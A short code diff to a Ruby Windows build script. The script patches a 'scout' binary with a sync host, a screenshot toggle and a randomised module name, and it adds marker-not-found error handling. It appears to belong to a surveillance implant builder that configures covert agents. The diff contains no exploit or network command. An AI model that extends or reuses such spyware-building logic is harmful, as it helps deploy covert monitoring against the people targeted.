@@ -45,13 +45,25 @@ class BuildWindows < Build
     params[:config] = nil
     super
 
+    marker = nil
+
     trace :debug, "Patching scout for sync and shot"
 
     patch_file(:file => 'scout') do |content|
+      begin
       host = @factory.configs.first.sync_host
       raise "Sync host not found" unless host
+      marker = "Sync"
       content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+
+      marker = "Screenshot"
       content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
+
+      marker = "Module name"
+      content.binary_patch 'MODUNAME', module_name('scout')
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
+      end
     end
 
     trace :debug, "Patching core function names and registry"
@@ -507,6 +519,8 @@ class BuildWindows < Build
         progressive = ('A'.ord + (first_alpha.ord + 32) % 26).chr
       when 'core64'
         progressive = ('A'.ord + (first_alpha.ord + 64) % 26).chr
+      when 'scout'
+        progressive = ('A'.ord + (first_alpha.ord + 17) % 26).chr
     end
 
     first_alpha + SecureRandom.hex(1) + progressive + LicenseManager.instance.limits[:magic][4..7]
